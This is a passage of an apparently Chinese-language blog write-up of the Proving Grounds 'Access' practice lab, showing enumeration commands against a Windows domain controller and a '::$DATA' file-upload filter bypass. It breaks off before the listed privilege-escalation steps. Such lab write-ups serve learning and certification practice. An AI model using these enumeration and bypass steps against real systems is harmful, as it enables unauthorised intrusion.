@@ -1,0 +1,1067 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>ProvingGrounds Access Writeup - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="description" content="Access 第14台，Windows系统，难度中等Intermediate，名称 Access
+"><meta name="keywords" content='OSCP, PG_Practice'>
+  <meta itemprop="name" content="ProvingGrounds Access Writeup">
+  <meta itemprop="description" content="Access 第14台，Windows系统，难度中等Intermediate，名称 Access">
+  <meta itemprop="datePublished" content="2024-01-12T06:17:36+00:00">
+  <meta itemprop="dateModified" content="2024-01-12T06:17:36+00:00">
+  <meta itemprop="wordCount" content="2866">
+  <meta itemprop="keywords" content="OSCP,PG_Practice"><meta property="og:url" content="http://localhost:1313/posts/provinggrounds-access/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="ProvingGrounds Access Writeup">
+  <meta property="og:description" content="Access 第14台，Windows系统，难度中等Intermediate，名称 Access">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-01-12T06:17:36+00:00">
+    <meta property="article:modified_time" content="2024-01-12T06:17:36+00:00">
+    <meta property="article:tag" content="OSCP">
+    <meta property="article:tag" content="PG_Practice">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ProvingGrounds Access Writeup">
+  <meta name="twitter:description" content="Access 第14台，Windows系统，难度中等Intermediate，名称 Access">
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/provinggrounds-access/" title="ProvingGrounds Access Writeup - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/provinggrouds_surf_writeup/" title="ProvingGrouds Surf WriteUp" /><link rel="next" type="text/html" href="http://localhost:1313/posts/provinggrounds-heist/" title="ProvingGrounds Heist Writeup" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/provinggrounds-access/index.md" title="ProvingGrounds Access Writeup - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "ProvingGrounds Access Writeup",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/provinggrounds-access\/"
+    },"genre": "posts","keywords": "OSCP, PG_Practice","wordcount":  2866 ,
+    "url": "http:\/\/localhost:1313\/posts\/provinggrounds-access\/","datePublished": "2024-01-12T06:17:36+00:00","dateModified": "2024-01-12T06:17:36+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>ProvingGrounds Access Writeup</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="post-category" title="分类 - 靶场"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div><div class="post-meta-line"><span title="发布于 2024-01-12 06:17:36"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-01-12">2024-01-12</time></span>&nbsp;<span title="2866 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 2900 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 6 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#access">Access</a></li>
+    <li><a href="#port">Port</a></li>
+    <li><a href="#init-access">Init Access</a>
+      <ul>
+        <li><a href="#53-dns">53-DNS</a></li>
+        <li><a href="#88-kerberos">88-Kerberos</a></li>
+        <li><a href="#80-http">80-http</a></li>
+      </ul>
+    </li>
+    <li><a href="#prive">PrivE</a>
+      <ul>
+        <li><a href="#spn">SPN</a></li>
+        <li><a href="#ticket">Ticket</a></li>
+        <li><a href="#crack-hash">Crack Hash</a></li>
+        <li><a href="#runascs">RunasCs</a></li>
+      </ul>
+    </li>
+    <li><a href="#prive-1">PrivE</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="access" class="heading-element"><span>Access</span>
+  <a href="#access" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>第14台，Windows系统，难度中等Intermediate，名称 Access</p>
+<p>IP：192.168.xx.187</p>
+<h2 id="port" class="heading-element"><span>Port</span>
+  <a href="#port" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Access<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -n -r --min-rate<span class="o">=</span><span class="m">3500</span> -sSV  -T4 192.168.167.187
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> xavier 的密码：
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-01-11 23:53 CST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.167.187
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.17s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">988</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp   open  http          Apache httpd 2.4.48 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1k PHP/8.0.7<span class="o">)</span>
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2024-01-11 15:53:35Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: access.offsec0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: access.offsec0., Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp open  tcpwrapped
+</span></span><span class="line"><span class="cl">Service Info: Host: SERVER<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 18.97 seconds</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="init-access" class="heading-element"><span>Init Access</span>
+  <a href="#init-access" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="53-dns" class="heading-element"><span>53-DNS</span>
+  <a href="#53-dns" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>域传送失败</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ dnsrecon -d access.offsec -n 192.168.167.187 -t axfr
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Checking <span class="k">for</span> Zone Transfer <span class="k">for</span> access.offsec name servers
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Resolving SOA Record
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>      SOA server.access.offsec 192.168.167.187
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Resolving NS Records
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> NS Servers found:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>      NS server.access.offsec 192.168.167.187
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Removing any duplicate NS server IP Addresses...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>  
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying NS server 192.168.167.187
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 192.168.167.187 Has port <span class="m">53</span> TCP Open
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Zone Transfer Failed <span class="o">(</span>Zone transfer error: REFUSED<span class="o">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="88-kerberos" class="heading-element"><span>88-Kerberos</span>
+  <a href="#88-kerberos" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>域用户爆破</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -p <span class="m">88</span> --script<span class="o">=</span>krb5-enum-users --script-args krb5-enum-users.realm<span class="o">=</span><span class="s2">&#34;access.offsec&#34;</span>,userdb<span class="o">=</span><span class="s2">&#34;/usr/share/wordlists/seclists/Usernames/Names/names.txt&#34;</span> 192.168.167.187</span></span></code></pre></td></tr></table>
+</div>
+</div><p>无成果</p>
+<h3 id="80-http" class="heading-element"><span>80-http</span>
+  <a href="#80-http" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Web扫描</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Access<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ dirsearch -x 400,403,404  -t <span class="m">500</span> -e php,ini,txt,bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://192.168.167.187
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Access<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ dirsearch -x 400,404  -t <span class="m">500</span> -e php,ini,txt,bak -u http://192.168.167.187 </span></span></code></pre></td></tr></table>
+</div>
+</div><p>发下如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.167.187/cgi-bin/printenv.pl		# 系统环境信息</span></span></code></pre></td></tr></table>
+</div>
+</div><p>对Web页面进行信息搜集，发现一个文件上传功能点</p>
+<p><img loading="lazy" src="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003429974.png" alt="image-20240112003429974" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003429974.png?size=small, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003429974.png?size=medium 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003429974.png?size=large 2x" data-title="image-20240112003429974" style="--width: 2322px;--aspect-ratio: 2322 / 1542;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>尝试上传PHP文件失败</p>
+<p><img loading="lazy" src="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003633057.png" alt="image-20240112003633057" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003633057.png?size=small, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003633057.png?size=medium 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003633057.png?size=large 2x" data-title="image-20240112003633057" style="--width: 2520px;--aspect-ratio: 2520 / 1396;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>尝试绕过</p>
+<p>Web扫描时发现有</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Access<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ dirsearch -x 400,404  -t <span class="m">500</span> -e php,ini,txt,bak -u http://192.168.167.187 
+</span></span><span class="line"><span class="cl">……
+</span></span><span class="line"><span class="cl"><span class="o">[</span>00:08:28<span class="o">]</span> <span class="m">301</span> -  344B  - /uploads  -&gt;  http://192.168.167.187/uploads/     
+</span></span><span class="line"><span class="cl"><span class="o">[</span>00:08:28<span class="o">]</span> <span class="m">403</span> -  304B  - /web.config::<span class="nv">$DATA</span>                                
+</span></span><span class="line"><span class="cl"><span class="o">[</span>00:08:29<span class="o">]</span> <span class="m">403</span> -  423B  - /webalizer</span></span></code></pre></td></tr></table>
+</div>
+</div><p>尝试使用<code>::$DATA</code>进行文件上传绕过，成功。</p>
+<p><img loading="lazy" src="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003822462.png" alt="image-20240112003822462" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003822462.png?size=small, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003822462.png?size=medium 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003822462.png?size=large 2x" data-title="image-20240112003822462" style="--width: 2240px;--aspect-ratio: 2240 / 1452;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
